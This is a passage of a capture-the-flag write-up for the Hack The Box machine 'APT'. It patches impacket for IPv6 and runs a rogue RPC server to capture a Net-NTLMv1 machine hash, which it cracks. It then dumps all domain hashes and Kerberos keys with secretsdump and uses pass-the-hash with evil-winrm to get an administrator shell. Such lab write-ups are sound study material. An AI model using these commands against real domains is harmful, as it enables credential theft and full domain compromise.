+<p>Running like this will cause a crash in the <code class="language-plaintext highlighter-rouge">smbrelayclient</code> because it is not ready to handle IPv6 addresses. In <code class="language-plaintext highlighter-rouge">impacket/examples/ntlmrelayx/clients/__init__.py</code>, with <code class="language-plaintext highlighter-rouge">pdb</code> I was able to debug this code:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">ProtocolClient</span><span class="p">:</span>
+    <span class="n">PLUGIN_NAME</span> <span class="o">=</span> <span class="sh">'</span><span class="s">PROTOCOL</span><span class="sh">'</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">serverConfig</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="n">targetPort</span><span class="p">,</span> <span class="n">extendedSecurity</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">serverConfig</span> <span class="o">=</span> <span class="n">serverConfig</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">targetHost</span> <span class="o">=</span> <span class="n">target</span><span class="p">.</span><span class="n">hostname</span>
+        <span class="c1"># A default target port is specified by the subclass
+</span>        <span class="k">if</span> <span class="n">target</span><span class="p">.</span><span class="n">port</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
+            <span class="c1"># We override it by the one specified in the target
+</span>            <span class="n">self</span><span class="p">.</span><span class="n">targetPort</span> <span class="o">=</span> <span class="n">target</span><span class="p">.</span><span class="n">port</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">self</span><span class="p">.</span><span class="n">targetPort</span> <span class="o">=</span> <span class="n">targetPort</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">target</span> <span class="o">=</span> <span class="n">target</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">extendedSecurity</span> <span class="o">=</span> <span class="n">extendedSecurity</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">session</span> <span class="o">=</span> <span class="bp">None</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">sessionData</span> <span class="o">=</span> <span class="p">{}</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">target.hostname</code> was <code class="language-plaintext highlighter-rouge">dead</code>, which is the first quad of the IPv6 address. It seems it’s splitting the hostname on <code class="language-plaintext highlighter-rouge">:</code>, expecting the format <code class="language-plaintext highlighter-rouge">host:port</code>. <code class="language-plaintext highlighter-rouge">target.netloc</code> will give the full uri for the target (<code class="language-plaintext highlighter-rouge">'dead:beef::b885:d62a:d679:573f:445'</code>), so I can use that to do the initialization required in this function. I’ll check for more than 2 colons on the <code class="language-plaintext highlighter-rouge">netloc</code>, which will be in IPv6 but not IPv4.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">ProtocolClient</span><span class="p">:</span>
+    <span class="n">PLUGIN_NAME</span> <span class="o">=</span> <span class="sh">'</span><span class="s">PROTOCOL</span><span class="sh">'</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">serverConfig</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="n">targetPort</span><span class="p">,</span> <span class="n">extendedSecurity</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">serverConfig</span> <span class="o">=</span> <span class="n">serverConfig</span>
+        <span class="k">if</span> <span class="n">target</span><span class="p">.</span><span class="n">netloc</span><span class="p">.</span><span class="nf">count</span><span class="p">(</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">:</span>
+            <span class="n">self</span><span class="p">.</span><span class="n">targetHost</span> <span class="o">=</span> <span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">netloc</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+            <span class="n">self</span><span class="p">.</span><span class="n">target</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">targetHost</span>
+            <span class="n">self</span><span class="p">.</span><span class="n">targetPort</span> <span class="o">=</span> <span class="n">targetPort</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">self</span><span class="p">.</span><span class="n">targetHost</span> <span class="o">=</span> <span class="n">target</span><span class="p">.</span><span class="n">hostname</span>
+            <span class="c1"># A default target port is specified by the subclass
+</span>            <span class="k">if</span> <span class="n">target</span><span class="p">.</span><span class="n">port</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
+                <span class="c1"># We override it by the one specified in the target
+</span>                <span class="n">self</span><span class="p">.</span><span class="n">targetPort</span> <span class="o">=</span> <span class="n">target</span><span class="p">.</span><span class="n">port</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">self</span><span class="p">.</span><span class="n">targetPort</span> <span class="o">=</span> <span class="n">targetPort</span>
+            <span class="n">self</span><span class="p">.</span><span class="n">target</span> <span class="o">=</span> <span class="n">target</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">extendedSecurity</span> <span class="o">=</span> <span class="n">extendedSecurity</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">session</span> <span class="o">=</span> <span class="bp">None</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">sessionData</span> <span class="o">=</span> <span class="p">{}</span> 
+</code></pre></div></div>
+<p>I’ll need a main file to create and manage the server:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span><span class="kn">import</span> <span class="n">sys</span>
+<span class="kn">import</span> <span class="n">logging</span>
+<span class="kn">from</span> <span class="n">impacket.examples.ntlmrelayx.servers.rpcrelayserver</span> <span class="kn">import</span> <span class="n">RPCRelayServer</span>
+<span class="kn">from</span> <span class="n">impacket.examples</span> <span class="kn">import</span> <span class="n">logger</span>
+<span class="kn">from</span> <span class="n">impacket.examples.ntlmrelayx.utils.config</span> <span class="kn">import</span> <span class="n">NTLMRelayxConfig</span>
+<span class="kn">from</span> <span class="n">impacket.examples.ntlmrelayx.utils.targetsutils</span> <span class="kn">import</span> <span class="n">TargetsProcessor</span>
+
+<span class="n">logger</span><span class="p">.</span><span class="nf">init</span><span class="p">(</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">logging</span><span class="p">.</span><span class="nf">getLogger</span><span class="p">().</span><span class="nf">setLevel</span><span class="p">(</span><span class="n">logging</span><span class="p">.</span><span class="n">DEBUG</span><span class="p">)</span>
+
+<span class="n">c</span> <span class="o">=</span> <span class="nc">NTLMRelayxConfig</span><span class="p">()</span>
+<span class="n">c</span><span class="p">.</span><span class="nf">setEncoding</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="nf">getdefaultencoding</span><span class="p">())</span>
+<span class="n">c</span><span class="p">.</span><span class="nf">setSMB2Support</span><span class="p">(</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">c</span><span class="p">.</span><span class="nf">setListeningPort</span><span class="p">(</span><span class="mi">135</span><span class="p">)</span>
+<span class="n">c</span><span class="p">.</span><span class="nf">setInterfaceIp</span><span class="p">(</span><span class="sh">''</span><span class="p">)</span>
+<span class="n">c</span><span class="p">.</span><span class="nf">setIPv6</span><span class="p">(</span><span class="bp">True</span><span class="p">)</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="nc">RPCRelayServer</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">run</span><span class="p">()</span>
+</code></pre></div></div>
+<p>I’ll run create a virtual env to run all this in and install the needed packages:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>python3 <span class="nt">-m</span> venv venv
+<span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">source </span>venv/bin/activate
+<span class="gp">(venv) oxdf@parrot$</span><span class="w"> </span>pip <span class="nb">install</span> <span class="nt">-r</span> requirements.txt
+<span class="go">...[snip]...
+</span></code></pre></div></div>
+<h4 id="capture-challenge">Capture Challenge</h4>
+<p>I’ll run the server:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">(venv) oxdf@parrot$</span><span class="w"> </span>python rpcsrv.py 
+<span class="go">[2021-04-07 10:28:10] [*] Setting up RPC Server
+</span></code></pre></div></div>
+<p>From APT, I’ll upload my modified RoguePotato binary and run it. It hangs for a minute, and prints failure. That’s ok, because I wasn’t expecting RoguePotato to work. Back at the RPC server:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">(venv) oxdf@parrot$ </span>python rpcsrv.py 
+<span class="go">[2021-04-07 10:28:10] [*] Setting up RPC Server
+[2021-04-07 10:28:35] [*] Callback added for UUID 99FCFEC4-5260-101B-BBCB-00AA0021347A V:0.0
+[2021-04-07 10:28:35] [*] RPCD: Received connection from dead:beef::b885:d62a:d679:573f
+[2021-04-07 10:28:35] [+] RPC: Received packet of type MSRPC BIND
+[2021-04-07 10:28:35] [+] Answering to a BIND without authentication
+[2021-04-07 10:28:35] [+] RPC: Sending packet of type MSRPC BINDACK
+[2021-04-07 10:28:35] [+] RPC: Received packet of type MSRPC REQUEST
+[2021-04-07 10:28:35] [+] RPC: Sending packet of type MSRPC RESPONSE
+[2021-04-07 10:28:35] [*] Callback added for UUID 99FCFEC4-5260-101B-BBCB-00AA0021347A V:0.0
+[2021-04-07 10:28:35] [*] RPCD: Received connection from dead:beef::b885:d62a:d679:573f
+[2021-04-07 10:28:35] [+] RPC: Received packet of type MSRPC BIND
+[2021-04-07 10:28:35] [-] Signing is required, attack won't work unless using -remove-target / --remove-mic
+[2021-04-07 10:28:35] [+] RPC: Sending packet of type MSRPC BINDACK
+[2021-04-07 10:28:35] [+] RPC: Received packet of type MSRPC AUTH3
+APT$::HTB:95aca8c7248774cb427e1ae5b8d5ce6830a49b5bb858d384:95aca8c7248774cb427e1ae5b8d5ce6830a49b5bb858d384:1122334455667788 ntlm
+[2021-04-07 10:28:35] [+] RPC: Received packet of type MSRPC REQUEST
+[2021-04-07 10:28:35] [-] Unsupported DCERPC opnum 4 called for interface ('99FCFEC4-5260-101B-BBCB-00AA0021347A', '0.0')
+[2021-04-07 10:28:35] [+] RPC: Sending packet of type MSRPC FAULT
+[2021-04-07 10:28:35] [+] RPC: Connection closed by client
+[2021-04-07 10:28:46] [-] Connection reset.
+</span></code></pre></div></div>
+<p>In the middle is the Net-NTLMv1 hash:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>APT$::HTB:95aca8c7248774cb427e1ae5b8d5ce6830a49b5bb858d384:95aca8c7248774cb427e1ae5b8d5ce6830a49b5bb858d384:1122334455667788
+</code></pre></div></div>
+<h3 id="crack-hash">Crack Hash</h3>
+<p>Either of the above methods produce a Net-NTLMv1 hash, which I can now take to the <a href="https://crack.sh/get-cracking/">crack.sh submission page</a>, and put it in (it qualifies for free):</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210405142435856.webp" type="image/webp"/>
+<img alt="image-20210405142435856" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210405142435856.png"/>
+</picture>
+<p>The hash came back minutes later:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210405142521066.webp" type="image/webp"/>
+<img alt="image-20210405142521066" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210405142521066.png"/>
+</picture>
+<h3 id="dump-hashes-1">Dump Hashes</h3>
+<p>Now I have the NTLM hash for the machine account of this domain controller. That can be used with <code class="language-plaintext highlighter-rouge">secretsdump.py</code> to dump the hashes for the rest of the AD:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$ </span>secretsdump.py <span class="nt">-hashes</span> :d167c3238864b12f5f82feae86a7f798 <span class="s1">'htb.local/APT$@htb.local'</span>
+<span class="go">Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:738f00ed06dc528fd7ebb7a010e50849:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+henry.vinson:1105:aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb:::
+henry.vinson_adm:1106:aad3b435b51404eeaad3b435b51404ee:4cd0db9103ee1cf87834760a34856fef:::
+APT$:1001:aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:72f9fc8f3cd23768be8d37876d459ef09ab591a729924898e5d9b3c14db057e3
+Administrator:aes128-cts-hmac-sha1-96:a3b0c1332eee9a89a2aada1bf8fd9413
+Administrator:des-cbc-md5:0816d9d052239b8a
+krbtgt:aes256-cts-hmac-sha1-96:b63635342a6d3dce76fcbca203f92da46be6cdd99c67eb233d0aaaaaa40914bb
+krbtgt:aes128-cts-hmac-sha1-96:7735d98abc187848119416e08936799b
+krbtgt:des-cbc-md5:f8c26238c2d976bf
+henry.vinson:aes256-cts-hmac-sha1-96:63b23a7fd3df2f0add1e62ef85ea4c6c8dc79bb8d6a430ab3a1ef6994d1a99e2
+henry.vinson:aes128-cts-hmac-sha1-96:0a55e9f5b1f7f28aef9b7792124af9af
+henry.vinson:des-cbc-md5:73b6f71cae264fad
+henry.vinson_adm:aes256-cts-hmac-sha1-96:f2299c6484e5af8e8c81777eaece865d54a499a2446ba2792c1089407425c3f4
+henry.vinson_adm:aes128-cts-hmac-sha1-96:3d70c66c8a8635bdf70edf2f6062165b
+henry.vinson_adm:des-cbc-md5:5df8682c8c07a179
+APT$:aes256-cts-hmac-sha1-96:4c318c89595e1e3f2c608f3df56a091ecedc220be7b263f7269c412325930454
+APT$:aes128-cts-hmac-sha1-96:bf1c1795c63ab278384f2ee1169872d9
+APT$:des-cbc-md5:76c45245f104a4bf
+[*] Cleaning up... 
+</span></code></pre></div></div>
+<h3 id="shell-1">Shell</h3>
+<p>The administrator hash is enough to get a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>evil-winrm <span class="nt">-u</span> administrator <span class="nt">-H</span> c370bddf384a691d811ff3495e8a72e2 <span class="nt">-i</span> apt.htb
+<span class="go">
+Evil-WinRM shell v2.4
+
+Info: Establishing connection to remote endpoint
+
+</span><span class="gp">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</span><span class="w">
+</span></code></pre></div></div>
+<p>And get the root flag:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\Users\Administrator\desktop&gt;</span><span class="w"> </span><span class="kr">type</span><span class="w"> </span><span class="n">root.txt</span><span class="w">
+</span><span class="go">d93e6432************************
+</span></code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2021/04/10/htb-apt.html"></a>
+</article>
